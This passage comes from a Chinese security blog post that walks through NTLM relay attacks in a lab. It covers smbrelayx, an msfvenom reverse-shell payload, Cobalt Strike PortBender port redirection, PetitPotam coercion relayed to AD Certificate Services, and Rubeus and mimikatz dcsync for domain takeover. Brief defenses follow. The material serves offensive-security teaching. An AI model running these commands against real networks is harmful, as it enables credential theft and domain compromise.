+<h2 id="实网对抗下的中继打法"><a href="#实网对抗下的中继打法" class="headerlink" title="实网对抗下的中继打法"></a>实网对抗下的中继打法</h2><h3 id="被动攻击方式"><a href="#被动攻击方式" class="headerlink" title="被动攻击方式"></a>被动攻击方式</h3><p>​    前面在中继攻击<code>SMB</code>的时候用到的<code>smbrelayx.py</code>脚本，它用于在本地临时搭建一个<code>SMB</code>服务，当域内其他用户访问这个服务的时候，就可以捕获<code>Net-NTLM Hash</code>，从而中继到其他机器上面。</p>
+<p>​    但是在实际场景下，这种方法要实现起来比较困难。首先当前机器的445端口要没有被占用，一般在<code>Windows</code>操作系统下，445端口都是被占用的。其次就是需要目标机器存在<code>Python</code>环境。因此，如果在内网环境下，目标机器是<code>Linux</code>的话，可以考虑利用此方式。</p>
+<p>​    实验拓扑环境如下：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125101135803.png" alt="image-20211125101135803"></p>
+<p>​    我在主机<code>10.10.10.24</code>上通过<code>smbrelayx.py</code>临时搭建一个<code>SMB</code>服务，然后将捕获的<code>Net-NTLM Hash</code>中继到受害者机器<code>10.10.10.18</code>上面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 10.10.10.18 -c whoami</span><br></pre></td></tr></table></figure>
+
+<p>​    当域内主机访问<code>10.10.10.24</code>的<code>SMB</code>，就会与其进行<code>NTLM</code>认证，然后捕获到<code>Net-NTLM Hash</code>之后，中继到其他机器：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125100540635.png" alt="image-20211125100540635"></p>
+<p>​    也可以和其他工具联动，例如可以通过<code>msfvenom</code>生成一个<code>shell.exe</code>，然后放置到攻击机上面。当中继攻击成功以后，可以让他下载本地的<code>shell.exe</code>并运行，这样，在<code>msf</code>中开启监听后，就可以获取到目标的<code>shell</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 生成shell.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.24 LPORT=8899 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>​    然后使用<code>exploit/multi/handler</code>，配置<code>AutoRunScript</code>，当获取到<code>shell</code>让他进程自动迁移，避免<code>shell</code>文件被删除时连接的<code>shell</code>断开：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125102540282.png" alt="image-20211125102540282"></p>
+<p>​    然后临时搭建<code>SMB</code>服务，利用<code>smbrelayx.py</code>的<code>-e</code>参数指定下载运行的文件路径，让获取到<code>Net-NTLM Hash</code>之后，<code>msf</code>就会收到反弹获取的<code>shell</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 10.10.10.18 -e ../../shell.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="主动攻击方式"><a href="#主动攻击方式" class="headerlink" title="主动攻击方式"></a>主动攻击方式</h3><h4 id="PortBender流量重定向"><a href="#PortBender流量重定向" class="headerlink" title="PortBender流量重定向"></a><code>PortBender</code>流量重定向</h4><p>​    在实际的网络拓扑环境下，一般都是通过团队服务器向目标主机上传一个<code>beacon</code>后获取权限。此时进行中继攻击就会存在几个问题，比如：目标445端口已经被占用，所以不能直接嗅探该端口传入的流量。又或者目标<code>Windows</code>主机上没有一些语言环境，操作不方便。</p>
+<p>​    最简单的一种实网拓扑结构：图来自<code>https://rastamouse.me/ntlm-relaying-via-cobalt-strike/</code></p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124175507506.png" alt="image-20211124175507506"></p>
+<p>​    <code>TeamServer</code>位于互联网。当目标主机通过<code>beacon</code>控制之后，如果要利用<code>NTLM Relay</code>攻击中继到内网的其他机器，最简单的做法就像上面那样，开启监听之后<code>Relay</code>到其他机器，但这里存在的一个问题是，如果目标机器的445端口占用了，也就是说不能直接监听到445的流量，同时，内网环境下，目标通常是<code>Windows</code>操作系统，如果没有装<code>Python</code>，那么有一些工具就不能运行。</p>
+<p>​    因此，在对抗过程中，可以使用端口流量的重定向，以及流量转发，代理来实现攻击机通过<code>TeamServer</code>攻击内网。</p>
+<p>​    <code>PortBender</code>工具可以用于端口流量的重定向，工具地址：<code>https://github.com/praetorian-inc/PortBender</code>，将<code>PortBender.cna</code>导入到<code>Cobalt Strike</code>中。</p>
+<p>​    当获取一个<code>SYSTEM</code>权限的<code>beacon</code>之后，通过<code>upload</code>命令将<code>WinDivert64.sys</code>或者<code>WinDivert32.sys</code>上传到目标主机（根据目标主机的类型），然后执行:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortBender redirect 445 8445</span><br></pre></td></tr></table></figure>
+
+<p>​    此时会将445端口的流量重定向到8445端口，接下来配置<code>rportfwd</code>。</p>
+<p>​    <code>Cobalt Strike</code>工具自带的<code>rportfwd</code>，用于远程端口转发，即将目标机器的某个端口流量全部转发到远端指定的一个端口，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 8445 10.10.20.25 445</span><br></pre></td></tr></table></figure>
+
+<p>​    表示将此台（受控端）主机8445端口的流量转发到攻击机（10.10.20.25）的445端口上。也就是说445端口的流量此时通过重定向，发送给了8445端口，由于远程端口转发，本地8445端口流量全部转发到远程主机的445端口上。</p>
+<p>​    此时设置一个代理，通过代理运行<code>nltmrelayx.py</code>进行中继攻击的监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 开启代理</span><br><span class="line">socks 1080</span><br><span class="line"></span><br><span class="line"># 配置代理/etc/proxychains4.conf</span><br><span class="line">socks4 10.10.20.24 1080</span><br><span class="line"></span><br><span class="line"># 中继攻击监听</span><br><span class="line">proxychains python3 ntlmrelayx.py -t smb://10.10.10.18 -smb2support</span><br></pre></td></tr></table></figure>
+
+<p>​    当受控主机的<code>445</code>端口收到身份认证的流量之后，将会将流量传送到监听的远程攻击主机上，收到<code>Net-NTLM Hash</code>之后，通过<code>socks</code>代理，就可以中继到内网的其他主机。</p>
+<p>​    这里顺便提一下，就是此时域内主机主动连接该445端口，是不会进行认证的。（域内主机发送了一个询问流量之后，不会收到来自该主机的响应）因此，单纯利用这种方式被动的等待比较鸡肋。在这种情况下并不是进行被动收集<code>Net-NTLM Hash</code>，而是通过主动攻击的方式，利用一些漏洞，比如打印机漏洞，还有最近比较火的<code>PetitPotam</code>，主动向该端口发送<code>Net-NTLM Hash</code>。</p>
+<h4 id="利用PetitPotam中继ADCS接管域"><a href="#利用PetitPotam中继ADCS接管域" class="headerlink" title="利用PetitPotam中继ADCS接管域"></a>利用<code>PetitPotam</code>中继<code>ADCS</code>接管域</h4><p>​    由于<code>NTLM Relay</code>不能够中继自己，所以利用这种方式进行攻击，更像是一种提权手段，在已知域内一台主机账号密码的情况下，可以让他向<code>CS</code>发送<code>NTLM</code>请求，获取一个证书。</p>
+<p>​    最近内网攻防比较火的一种攻击方式，利用<code>PetitPotam</code>，强制域内主机发起<code>NTLM Hash</code>，中继到<code>ADCS</code>获取证书，从中提取<code>TGT</code>，利用票据传递接管域控。</p>
+<p>​    <code>PetitPotam</code>中继攻击，这是一种新型的<code>NTLM Relay</code>攻击利用手法，其利用了微软加密文件系统远程协议。利用该漏洞，攻击者连接到<code>LSARPC</code>后能够强制触发目标机器向指定的远程服务器发送<code>Net-NTLM Hash</code>，在获取到<code>Net-NTLM Hash</code>之后，就能够进行<code>NTLM Relay</code>攻击。</p>
+<p>​    而<code>ADCS</code>证书服务器在默认安装之后，由于<code>ADCS</code>的<code>HTTP</code>证书接口（<code>/certsrv/certfnsh.asp </code>）没有启用<code>NTLM</code>中继保护，并且在<code>HTTP</code>请求的时候，<code>Authorization HTTP</code>标头明确指定只允许通过<code>NTLM</code>进行身份验证。因此，配合上面的<code>PetitPotam</code>的方式，强制域控向该接口发送<code>Net-NTLM Hash</code>，从而可以获取到一个域内的证书，从中提取<code>TGT</code>，利用票据传递接管域控。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125132241179.png" alt="image-20211125132241179"></p>
+<p>​    在内网环境中，如果存在两个域控（一个主域控，一个辅助域控），都安装了<code>ADCS</code>证书服务的话，可以导出<code>TGT</code>，从而接管域控：（实验拓扑图）</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165454471.png" alt="image-20211125165454471"></p>
+<p>​    由于在<code>win2008</code>和<code>win2012</code>环境下，通过<code>PetitPotam</code>强制域控发起<code>Net-NTLM Hash</code>可以以匿名的方式，也就是说不需要知道账号密码也可发送。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -d de1ay 10.10.10.25 10.10.10.99</span><br></pre></td></tr></table></figure>
+
+<p>​    强制辅助域控（10.10.10.99）向本机（10.10.10.25）的445端口发送<code>Net-NTLM Hash</code>，然后在本地主机上捕获到<code>Net-NTLM Hash</code>之后，发起中继攻击，中继到域控主机（10.10.10.10）的<code>ADCS</code>服务上申请一个证书：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165436605.png" alt="image-20211125165436605"></p>
+<p>​    申请到证书之后，就可以通过<code>Rubeus</code>攻击从中提取出来<code>TGT</code>，转而接管域控：（这里假设<code>Win7</code>客户机已经被拿下，接下来操作在<code>Win7</code>上进行即可）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:username /certificate:证书的base64值 /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165751781.png" alt="image-20211125165751781"></p>
+<p>​    通过<code>mimikatz</code>可以查看<code>kerberos</code>票据信息：<code>kerberos::list</code>，导出<code>krbtgt</code>的哈希值：<code>lsadump::dcsync /user:krbtgt /csv</code></p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125170536240.png" alt="image-20211125170536240"></p>
+<p>​    而现实的网络拓扑环境可能是这个样子：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125173645507.png" alt="image-20211125173645507"></p>
+<p>​    所有的流量都通过<code>Win7</code>客户机发送给内网主机。<code>Win7</code>客户机的445端口被占用，此时想要通过同样的方式，攻击域控的<code>ADCS</code>可以使用<code>PortBender</code>将<code>TCP</code>流量重定向。</p>
+<p>​    具体攻击思路是将<code>Win7</code>上面的<code>445</code>端口流量重定向之后，<code>TeamServer</code>通过远程流量转发的方式，传回攻击者监听的445端口。攻击者开启<code>socks</code>代理，将流量传送到域控的80端口，请求获取一个证书。</p>
+<p>​    我这里利用<code>Cobalt Strick</code>，拿到<code>Win7</code>客户机的一个<code>System</code>权限的<code>Beacon</code>后，开启一个<code>socks</code>代理：<code>socks 1080</code>，然后远程转发端口流量，将<code>8445</code>的流量全部转发到攻击者的<code>445</code>端口：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180619684.png" alt="image-20211125180619684"></p>
+<p>​    之后上传<code>WinDivert32.sys</code>（我这里<code>Win7</code>是32位的），执行<code>PortBender  redirect 445 8445</code>，将<code>Win7</code>上的<code>445</code>端口流量全部转发到8445端口。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180945149.png" alt="image-20211125180945149"></p>
+<p>​    攻击机配置完代理之后，在攻击机上面开启攻击<code>ADCS</code>的脚本并监听来自445端口的流量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181138847.png" alt="image-20211125181138847"></p>
+<p>​    然后通过代理的方式，利用<code>PetitPotm</code>向辅助域控发送流量，强制其发送<code>Net-NTLM Hash</code>给<code>Win7</code>的445端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 PetitPotam.py -d de1ay 10.10.10.201 10.10.10.99</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181339132.png" alt="image-20211125181339132"></p>
+<p> 由于网络问题，多发几次包之后，就可以获取到证书信息：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181422207.png" alt="image-20211125181422207"></p>
+<h2 id="中继攻击防御措施"><a href="#中继攻击防御措施" class="headerlink" title="中继攻击防御措施"></a>中继攻击防御措施</h2><p>1、开启签名保护 </p>
+<p>​     默认只有域控是开启了<code>SMB</code>签名，⽽<code>LDAP</code>签名默认策略是协商签名，也就是说是否签名是由客户端决定的。</p>
+<p>2、<code>EAP</code>（<code>Enhanced Protection Authentication</code>）：</p>
+<p>   <code>NTLM</code>认证和⼀个安全通道进⾏绑定，在 <code>NTLM</code> 认证过程中，最后的<code> NTLM</code>认证数据报⽂包含⼀个⽬标应⽤服务器的证书摘要，这个摘要使⽤客户端的 <code>NTLM</code> 值进⾏签名保护，可以防⽌伪造证书的攻击。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    <code>NTLM Relay</code>是一种中间人攻击的方式，一般而言都是被动攻击，等待连接操作，但<code>PetitPotam</code>的出现，发生了一些改变。正如上面实验，在两台域控都安装了<code>ADCS</code>的情况下，不需要被动等待即可发起攻击。</p>
+<p>参考文章：</p>
+<p>【委派攻击】<a target="_blank" rel="noopener" href="https://www.bugbank.cn/live/view.html?id=114136">https://www.bugbank.cn/live/view.html?id=114136</a></p>
+<p>【利用<code>kerberos</code>身份验证中继攻击】<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></p>
+<p>【中继的实战打法】<a target="_blank" rel="noopener" href="https://rastamouse.me/ntlm-relaying-via-cobalt-strike/">https://rastamouse.me/ntlm-relaying-via-cobalt-strike/</a></p>
+<p>【证书服务器攻击与防御】<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245791#h2-11">https://www.anquanke.com/post/id/245791#h2-11</a></p>
+<p>【<code>ExchangeRelayx</code>】<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/184594.html">https://www.freebuf.com/news/184594.html</a></p>
+<p>【<code>Portbender</code>端口复用】<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/437340.html">http://cn-sec.com/archives/437340.html</a></p>
+<p>【利用<code>PetitPotam</code>进行<code>NTLM Relay</code>攻击】<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/120368697">https://blog.csdn.net/qq_36119192/article/details/120368697</a></p>
+<p>【无需<code>Linux</code>进行<code>NTLM Relay</code>】<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1896216">https://cloud.tencent.com/developer/article/1896216</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/" data-id="cl8h1i72s000c0bdp0bw2hy6k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/12/15/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          域渗透---黄金白银票据伪造
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">前端安全---Dom Clobbering</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
